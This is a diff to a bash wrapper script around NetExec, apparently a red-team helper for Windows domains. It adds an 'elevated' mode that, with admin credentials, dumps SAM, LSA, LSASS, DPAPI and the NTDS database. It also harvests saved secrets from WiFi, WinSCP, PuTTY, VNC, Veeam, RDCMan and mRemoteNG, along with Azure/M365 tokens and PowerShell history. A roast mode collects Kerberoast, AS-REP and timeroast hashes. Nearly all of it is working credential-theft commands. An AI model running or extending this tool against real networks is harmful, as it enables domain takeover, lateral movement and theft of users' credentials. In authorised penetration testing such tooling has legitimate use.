@@ -12,7 +12,8 @@ NC="${C}[0m"
 usage() {
   echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc>) -o <output-dir> [--local-auth]"
   echo ""
-  echo "  <mode>        creds | verify | roast"
+  echo "  <mode>        elevated | verify | roast"
+  echo "                  elevated: Requires elevated privileges (local admin+) to extract credentials and interesting information for lateral movement"
   echo "  <target>      Single IP or CIDR (or DC for roast mode)"
   echo "  -u            Username"
   echo "  -p            Password"
@@ -83,8 +84,8 @@ if [[ -z "$MODE" || -z "$TARGET" || -z "$USER" || -z "$OUTDIR" ]]; then
   usage
 fi
 
-if [[ "$MODE" != "creds" && "$MODE" != "verify" && "$MODE" != "roast" ]]; then
-  echo -e "${RED}[-] Mode must be one of: creds, verify, roast${NC}"
+if [[ "$MODE" != "elevated" && "$MODE" != "verify" && "$MODE" != "roast" ]]; then
+  echo -e "${RED}[-] Mode must be one of: elevated, verify, roast${NC}"
   usage
 fi
 
@@ -113,16 +114,39 @@ if [[ "$MODE" == "verify" ]]; then
 else
   LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
 fi
+
+if [[ "$MODE" == "elevated" ]]; then
+  CREDFILE="$OUTDIR"/"${TARGET}_creds.log"
+  INTERESTINGFILE="$OUTDIR"/"${TARGET}_interesting.log"
+fi
+
 mkdir -p "$OUTDIR"
 touch "$LOGFILE"
 
 log() {
-  echo -e "${BLUE}[+]${NC} $1"
+  local msg="$1"
+  local additional_file="$2"
+  
+  if [[ -n "$additional_file" ]]; then
+    echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE" | tee -a "$additional_file"
+  else
+    echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE"
+  fi
 }
 
 run_nxc() {
   log "Running: $*"
   unbuffer $* | tee -a "$LOGFILE"
+}
+
+run_nxc_creds() {
+  log "Running: $*" "$CREDFILE"
+  unbuffer $* | tee -a "$LOGFILE" | tee -a "$CREDFILE"
+}
+
+run_nxc_interesting() {
+  log "Running: $*" "$INTERESTINGFILE"
+  unbuffer $* | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
 }
 
 # build base auth flags
@@ -142,39 +166,64 @@ fi
 
 # ───────── Mode Logic ──────────
 case "$MODE" in
-creds)
-  log "Starting credential collection…"
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS --sam
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M lsassy
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M wifi
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
-  run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm
+elevated)
+  log "Starting credential and information collection…"
+  
+  # Credential extraction commands
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sam
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M lsassy
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --lsa
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --dpapi
+  
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M wifi
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M winscp
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M rdcman
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sccm
+  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M ntdsutil
+  log "Running: nxc smb $TARGET $AUTH_ARGS --ntds" "$CREDFILE"
+  script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"
+  
+  # Interesting information commands
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history -o EXPORT=True # The flag migth not work - remove if so
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS --qwinsta
+  log "Look at \"Impersonate logged-on User\" section in wiki in case of found sessions" "$INTERESTINGFILE"
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad++
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M eventlog_creds
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wam # Azure and M365 tokens
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M veeam
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M putty
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M vnc
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mremoteng
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M teams_localdb
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M security-questions
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wcc # Security conf
 
-  # Not including PS-history in logfile not to ruin the creds file
-  log "Running: nxc smb $TARGET $AUTH_ARGS -M powershell_history"
-  unbuffer nxc smb $TARGET $AUTH_ARGS -M powershell_history
-
-  log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
-  script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"
 
   log "Extracting potential credential lines…"
-  CREDFILE="$OUTDIR"/"${TARGET}_${MODE}.creds"
-  awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' $LOGFILE |
+  CREDFILE_PARSED="$OUTDIR"/"${TARGET}_creds_parsed.txt"
+  awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' "$CREDFILE" |
     rg -a '^\x1b\[1;33m|^Node' |
     sed -r 's/\x1b\[[0-9;]*m//g' |
-    sort -u >$CREDFILE
+    sort -u >"$CREDFILE_PARSED"
+
+  # Check for GMSA account
+  if grep -qF "SC_GMSA" "$CREDFILE"; then
+    GMSA_MSG="GMSA Account found! See Extract gMSA Secrets in wiki"
+    echo -e "${BLUE}[+]${NC} $GMSA_MSG" | tee -a "$LOGFILE" | tee -a "$CREDFILE_PARSED"
+  fi
 
   echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
-  echo -e "${GREEN}[✓] Unique credentials:   ${CREDFILE}"
+  echo -e "${GREEN}[✓] Credentials (raw):    ${CREDFILE}"
+  echo -e "${GREEN}[✓] Credentials (parsed): ${CREDFILE_PARSED}"
+  echo -e "${GREEN}[✓] Interesting info:     ${INTERESTINGFILE}"
   ;;
 
 verify)
   log "Starting service verification…"
   run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
-  # run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS
+  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --query "(sAMAccountName=$USER)" "sAMAccountName memberOf"
   run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
   run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
   run_nxc nxc ssh "$TARGET" $BASE_AUTH_ARGS
@@ -188,6 +237,7 @@ roast)
   log "Starting kerberoast & asreproast…"
   run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
   run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
+  run_nxc nxc smb "$TARGET" -M timeroast "$OUTDIR/timeroast.hash"
   echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
   echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
   ;;
